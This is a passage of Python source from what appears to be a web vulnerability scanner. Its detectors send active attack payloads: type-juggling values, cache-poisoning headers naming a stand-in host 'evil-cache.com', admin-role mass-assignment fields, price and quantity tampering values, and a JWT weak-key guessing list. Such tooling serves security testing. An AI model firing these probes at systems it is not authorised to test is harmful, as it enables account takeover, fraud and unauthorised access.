    "array": ("[]",),
    "magic_hash": ("0e123456", "0e654321"),
}


def detect_type_juggling(send, url, params=None) -> de.Result:
    """PHP type juggling: send special values to guess comparison bypass."""
    res = de.Result("type-juggling", de.SAFE, severity="critical", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    for category, payloads in _TYPE_JUGGLING_PAYLOADS.items():
        for payload in payloads:
            for pk, pv in (params or {"x": ""}).items():
                q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
                q[pk] = payload
                ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
                try:
                    r = send("GET", ourl, {}, {}, "", True)
                except Exception:
                    continue
                if r:
                    b = r.body or ""
                    # Check for auth bypass behavior (different response than baseline)
                    if pv and r.status < 400:
                        # If submitting 'true' gives a different response than original value
                        q2 = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
                        q2[pk] = pv
                        ourl2 = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q2)))
                        try:
                            r2 = send("GET", ourl2, {}, {}, "", True)
                        except Exception:
                            r2 = None
                        if r2 and de._similar(b, r2.body or "") < 0.7 and r.status != r2.status:
                            sigs.append(f"Type juggling {category} via {pk}: {r.status} vs {r2.status}")
                            res.proof[f"juggling_{pk}"] = {"category": category, "payload": payload, "control": pv}
                            res.confidence = de.PROBABLE
                            break
            if sigs:
                break
        if sigs:
            break

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 17  Cache Poisoning
# ═══════════════════════════════════════════════════════════════════════════════
_CACHE_POISON_HEADERS = (
    ("X-Forwarded-Host", "evil-cache.com"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Originating-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
)


def detect_cache_poisoning(send, url) -> de.Result:
    """Web cache poisoning: inject headers that may be cached."""
    res = de.Result("cache-poisoning", de.SAFE, severity="high", url=url)
    sigs = []

    for hdr, val in _CACHE_POISON_HEADERS:
        try:
            r1 = send("GET", url, {hdr: val}, {}, "", True)
        except Exception:
            continue
        if r1 is None:
            continue
        b1 = r1.body or ""
        hl1 = {k.lower(): v for k, v in (r1.headers or {}).items()}

        if val in b1:
            sigs.append(f"Cache poison via {hdr}: value in body")
            res.proof[f"cache_{hdr}"] = {"header": hdr, "value": val, "snippet": b1[:200]}
            res.confidence = de.PROBABLE
        # Check Location header (password reset poisoning)
        loc = hl1.get("location", "")
        if val in loc:
            sigs.append(f"Cache poison via {hdr}: poisoned Location")
            res.proof[f"cache_loc_{hdr}"] = {"header": hdr, "value": val, "location": loc[:120]}
            res.confidence = de.PROBABLE

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 18  Mass Assignment (upgraded) — field enumeration
# ═══════════════════════════════════════════════════════════════════════════════
_MASS_ASSIGN_FIELDS = ("admin", "role", "is_admin", "isActive", "access_level",
                       "permissions", "group", "user_type", "verified", "paid",
                       "isPaid", "account_type", "premium", "enabled")


def detect_mass_assignment_ext(send_fields, url="") -> de.Result:
    """Mass assignment: try privileged fields in JSON body."""
    res = de.Result("mass-assignment", de.SAFE, severity="critical", url=url)
    sigs = []

    for field in _MASS_ASSIGN_FIELDS:
        payloads = [
            {field: True},
            {field: "admin"},
            {field: 1},
            {field: "true"},
        ]
        for payload in payloads:
            try:
                r = send_fields(payload)
            except Exception:
                continue
            if r and r.status in (200, 201, 204):
                sigs.append(f"Mass assignment {field}={list(payload.values())[0]}")
                res.proof[f"mass_{field}"] = {"payload": payload, "status": r.status}
                res.confidence = de.PROBABLE
                break
    if len(sigs) >= 2:
        res.confidence = de.CONFIRMED
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 19  Race Condition — concurrent request window
# ═══════════════════════════════════════════════════════════════════════════════
def detect_race_condition(send, url, params=None, payload_field="") -> de.Result:
    """Race condition: fire concurrent requests looking for race window."""
    res = de.Result("race-condition", de.SAFE, severity="high", url=url)
    if not params and not payload_field:
        return res
    sigs = []
    pr = _uparse.urlparse(url)
    results = []
    errors = 0

    def _fire(_payload):
        nonlocal errors
        try:
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
            if payload_field and _payload is not None:
                q[payload_field] = _payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            r = send("GET", ourl, {}, {}, "", True)
            if r:
                return r.status, len(r.body or "")
        except Exception:
            errors += 1
        return None

    # Fire concurrent requests
    threads = []
    out = [None] * 10
    for i in range(10):
        t = threading.Thread(target=lambda idx=i: out.__setitem__(idx, _fire(str(random.randint(1000, 9999)) if payload_field else None)))
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=15)

    results = [x for x in out if x is not None]
    if len(results) >= 8:
        statuses = [r[0] for r in results]
        lengths = [r[1] for r in results]
        # If most requests succeeded but one showed different behavior (race window)
        unique_statuses = set(statuses)
        if len(unique_statuses) > 1:
            sigs.append(f"Race condition: {len(unique_statuses)} different status codes")
            res.proof["race_statuses"] = list(unique_statuses)
            res.confidence = de.PROBABLE
        # Check for TOCTOU (success despite expected failure)
        if 200 in statuses and 4 in [s // 100 for s in statuses]:
            sigs.append("Race condition: TOCTOU (some succeeded, some denied)")
            res.proof["race_toctou"] = {"statuses": statuses}
            res.confidence = de.PROBABLE

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 20  GraphQL Introspection + Batching + Depth (upgraded)
# ═══════════════════════════════════════════════════════════════════════════════
_GQL_INTROSPECTION_QUERY = """{"query":"query{__schema{types{name fields{name type{name kind}}}}}"}"""
_GQL_DEPTH_QUERY = """{"query":"query{d{"d":__typename""" + ",d" * 30 + """}}}"""
_GQL_BATCH = """[{"query":"query{__typename}"},{"query":"query{__typename}"}]"""


def detect_graphql_ext(send_post) -> de.Result:
    """Advanced GraphQL: introspection + depth recursion + batching."""
    res = de.Result("graphql", de.SAFE, severity="high")

    # Introspection (basic + advanced)
    try:
        r = send_post(_GQL_INTROSPECTION_QUERY)
        if r and r.status == 200:
            b = r.body or ""
            try:
                j = json.loads(b)
                if "data" in j and "__schema" in str(j.get("data", {}))[:200]:
                    res.signals.append("GraphQL introspection enabled")
                    res.proof["introspection"] = True
                    res.confidence = de.CONFIRMED
            except Exception:
                pass
    except Exception:
        pass

    # Depth recursion
    try:
        r = send_post(_GQL_DEPTH_QUERY)
        if r and r.status == 200:
            b = r.body or ""
            tb = "d" * 30 in b[:200] if len(b) < 2000 else True
            if tb:
                res.signals.append("GraphQL depth recursion accepted")
                res.proof["depth_recursion"] = True
    except Exception:
        pass

    # Batching
    try:
        r = send_post(_GQL_BATCH)
        if r and r.status == 200:
            b = r.body or ""
            if b.startswith("[") and "__typename" in b:
                res.signals.append("GraphQL batching enabled")
                res.proof["batching"] = True
    except Exception:
        pass

    if len(res.signals) >= 2:
        res.confidence = de.CONFIRMED
    elif len(res.signals) == 1:
        res.confidence = de.PROBABLE
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 21  JWT — full audit (none algo, weak key, key confusion)
# ═══════════════════════════════════════════════════════════════════════════════
_JWT_WEAK_KEYS = ("secret", "password", "123456", "qwerty", "admin", "key",
                  "jwt_secret", "my_secret", "pass", "test", "changeme", "abc123")


def detect_jwt_full(jwt_token, url="") -> de.Result:
    """Full JWT audit: none algorithm, weak HMAC key, key confusion."""
    res = de.Result("jwt", de.SAFE, severity="critical", url=url)
    sigs = []

    parts = str(jwt_token).split(".")
    if len(parts) != 3:
        return res

    # Decode header
    try:
        import base64
        pad = len(parts[0]) % 4
        hdr_b64 = parts[0] + ("=" * (4 - pad) if pad else "")
        header = json.loads(base64.urlsafe_b64decode(hdr_b64))
    except Exception:
        return res

    alg = header.get("alg", "").upper()

    # 1) None algorithm
    if alg in ("NONE", "None", "none"):
        sigs.append("JWT alg=none")
        res.proof["alg_none"] = True
        res.confidence = de.CONFIRMED

    # 2) Weak HMAC key
    if alg in ("HS256", "HS384", "HS512") and len(sigs) == 0:
        try:
            import hmac, hashlib
            msg = f"{parts[0]}.{parts[1]}"
            for key in _JWT_WEAK_KEYS:
                expected = base64.urlsafe_b64encode(
                    hmac.new(key.encode(), msg.encode(), getattr(hashlib, f"sha{alg[-3:]}")).digest()
                ).rstrip("=").decode()
                if expected == parts[2]:
                    sigs.append(f"JWT weak key: '{key}'")
                    res.proof["weak_key"] = key
                    res.confidence = de.CONFIRMED
                    break
        except Exception:
            pass

    # 3) Key confusion (RS256 vs HS256 - public key as HMAC secret)
    if alg == "RS256" and len(sigs) == 0:
        # Try using the JWK public key as HMAC secret if exposed
        jwk = header.get("jwk", {})
        if jwk:
            try:
                import hmac, hashlib
                pub_key = json.dumps(jwk, sort_keys=True)
                msg = f"{parts[0]}.{parts[1]}"
                expected = base64.urlsafe_b64encode(
                    hmac.new(pub_key.encode(), msg.encode(), hashlib.sha256).digest()
                ).rstrip("=").decode()
                if expected == parts[2]:
                    sigs.append("JWT key confusion (RS256→HS256 with JKU public key)")
                    res.proof["key_confusion"] = True
                    res.confidence = de.CONFIRMED
            except Exception:
                pass

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 22  Clickjacking (upgraded) — DOM-based detection
# ═══════════════════════════════════════════════════════════════════════════════
def detect_clickjacking_ext(page_headers=None, page_body="") -> de.Result:
    """Upgraded clickjacking: header + DOM-based frame-busting checks."""
    res = de.Result("clickjacking", de.SAFE, severity="medium")
    sigs = []

    hl = {k.lower(): v for k, v in (page_headers or {}).items()} if page_headers else {}
    xfo = hl.get("x-frame-options", "")
    csp = hl.get("content-security-policy", "")

    if xfo and xfo.upper() in ("DENY", "SAMEORIGIN"):
        sigs.append("X-Frame-Options present")
        res.confidence = de.SAFE
        return res

    if "frame-ancestors" in csp and "none" in csp:
        sigs.append("CSP frame-ancestors present")
        res.confidence = de.SAFE
        return res

    # Check for DOM-based frame busting
    if page_body:
        fb_patterns = (
            "if (top != self)", "if (top != window)", "if (self != top)",
            "top.location", "parent.location", "self !== top",
            "frameElement", "if (parent != window)",
        )
        has_framebust = any(p in page_body for p in fb_patterns)
        if not has_framebust and not xfo and "frame-ancestors" not in csp:
            sigs.append("No clickjacking protection (no header + no DOM frame-busting)")
            res.severity = "high"
            # Check if the page is UI-rich (likely target for clickjacking)
            ui_indicators = ("button", "form", "input", "click", "submit", "login", "sign")
            if any(ind in page_body.lower() for ind in ui_indicators):
                sigs.append("Page has interactive UI elements (high-value clickjack target)")
                res.confidence = de.PROBABLE
            else:
                res.confidence = de.PROBABLE

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 23  TLS / SSL — weak ciphers and HSTS check (passive)
# ═══════════════════════════════════════════════════════════════════════════════
def detect_tls_weak(page_headers=None, scheme="https", url="") -> de.Result:
    """TLS: HSTS missing, cookie security flags."""
    res = de.Result("tls", de.SAFE, severity="medium", url=url)
    sigs = []

    hl = {k.lower(): v for k, v in (page_headers or {}).items()} if page_headers else {}
    hsts = hl.get("strict-transport-security", "")

    if not hsts and scheme == "https":
        sigs.append("HSTS header missing")
        res.proof["hsts_missing"] = True
        res.confidence = de.PROBABLE
    elif hsts:
        sigs.append("HSTS present")
        res.confidence = de.SAFE
        # Check for short max-age
        m = re.search(r"max-age=(\d+)", hsts)
        if m and int(m.group(1)) < 31536000:
            sigs.append("HSTS max-age < 1 year")
            res.severity = "medium"

    # Check set-cookie without Secure flag
    set_cookie = hl.get("set-cookie", "")
    if set_cookie and "secure" not in set_cookie.lower():
        sigs.append("Cookie without Secure flag")
        res.proof["cookie_no_secure"] = set_cookie[:100]
        res.severity = "medium"

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 24  IDOR / Broken Access Control (AI-enhanced) — two-identity check
# ═══════════════════════════════════════════════════════════════════════════════
def detect_idor(send_victim, send_attacker, url="", user_param="id") -> de.Result:
    """IDOR: victim owns a resource, attacker tries to access it."""
    res = de.Result("idor", de.SAFE, severity="critical", url=url)
    sigs = []

    # Victim creates a resource
    marker = de._marker()
    try:
        r_v = send_victim(marker)
    except Exception:
        r_v = None
    if r_v is None:
        return res

    # Attacker tries to access the same resource
    try:
        r_a = send_attacker(marker)
    except Exception:
        r_a = None
    if r_a is None:
        return res

    # If both get the same content → IDOR
    v_body = r_v.body or ""
    a_body = r_a.body or ""
    if r_v.status in (200, 201) and r_a.status in (200, 201):
        if de._similar(v_body, a_body) > 0.8:
            sigs.append("IDOR: attacker accessed victim's resource")
            res.proof["idor"] = {"victim_status": r_v.status, "attacker_status": r_a.status}
            res.confidence = de.CONFIRMED
        elif marker in a_body and marker not in v_body:
            sigs.append("IDOR: attacker sees victim's marker")
            res.proof["idor_marker"] = {"attacker_body": a_body[:200]}
            res.confidence = de.CONFIRMED

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 25  Business Logic / AI-powered Anomaly Detection
# ═══════════════════════════════════════════════════════════════════════════════
def detect_business_logic_anomaly(send, url, baseline_body="", baseline_status=200) -> de.Result:
    """Detect biz-logic flaws by comparing response to baseline."""
    res = de.Result("business-logic", de.SAFE, severity="medium", url=url)
    sigs = []

    if not baseline_body:
        return res

    try:
        r = send("GET", url, {}, {}, "", True)
    except Exception:
        return res
    if r is None:
        return res

    # Check for unexpected variations
    b = r.body or ""
    sim = de._similar(b, baseline_body)
    if sim < 0.5 and r.status in (200, baseline_status):
        sigs.append(f"Business logic anomaly: response similarity {sim:.2f} vs expected")
        res.proof["biz_anomaly"] = {"similarity": sim, "status": r.status}
        res.confidence = de.PROBABLE

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 26  Business Logic AI — multi-step flow analysis
# ═══════════════════════════════════════════════════════════════════════════════
_BIZ_LOGIC_CHECKS = [
    ("price-manipulation", "checkout|cart|order|purchase|buy", "POST",
     ["price", "amount", "total", "cost", "value", "subtotal"],
     ["-1", "0", "0.01", "999999999", "1e9"]),
    ("quantity-manipulation", "cart|order|checkout", "POST",
     ["qty", "quantity", "count", "amount"],
     ["-1", "0", "9999", "1e9"]),
    ("status-manipulation", "order|payment|transaction|subscription", "POST",
     ["status", "state", "paid", "completed", "verified"],
     ["true", "confirmed", "completed", "paid", "1"]),
    ("admin-bypass", "admin|dashboard|manage|setting", "GET",
     ["role", "admin", "is_admin", "access", "user_type"],
     ["admin", "true", "1", "administrator"]),
]


def detect_business_logic(send, url, methods=("GET", "POST"), body_template="",
                          page_headers=None) -> de.Result:
    """Business logic flaw detection: price/qty/status manipulation + admin bypass."""
    res = de.Result("business-logic", de.SAFE, severity="critical", url=url)
    sigs = []
    pr = _uparse.urlparse(url)
    path_lower = pr.path.lower()

    for name, pattern, method, fields, values in _BIZ_LOGIC_CHECKS:
        if not re.search(pattern, path_lower):
            continue
        for field in fields:
            for val in values:
                try:
                    if method == "GET":
                        q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
                        q[field] = val
                        ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
                        r = send("GET", ourl, {}, {}, "", True)
                    else:
                        try:
                            bd = json.loads(body_template or "{}") if body_template else {}
                        except Exception:
                            bd = {}
                        bd[field] = val if val != "true" else True
                        r = send("POST", url,
                                {"Content-Type": "application/json"}, {},
                                json.dumps(bd), True)
                except Exception:
                    continue
                if r and r.status in (200, 201, 204):
                    sigs.append(f"Business logic: {name} via {field}={val} (status {r.status})")
                    res.proof[f"biz_{name}_{field}"] = {"value": val, "status": r.status}
                    res.confidence = de.PROBABLE
                    break
            if sigs:
                break
        if sigs:
            break

    # AI-enhanced
    if sigs and len(sigs) < 2:
        try:
            from ai_analyzer import analyze_business_logic
            ai_result = analyze_business_logic(url, sigs[0][:100], "", "", 200, 200)
            if ai_result.get("vulnerable") and ai_result.get("confidence", 0) > 70:
                res.confidence = de.CONFIRMED
                sigs.append(f"AI confirmed: {ai_result.get('type', 'business-logic')}")
                res.proof["ai_confirmed"] = ai_result
        except Exception:
            pass

    if len(sigs) >= 2:
        res.confidence = de.CONFIRMED
    res.signals = sigs[:4]
    return res
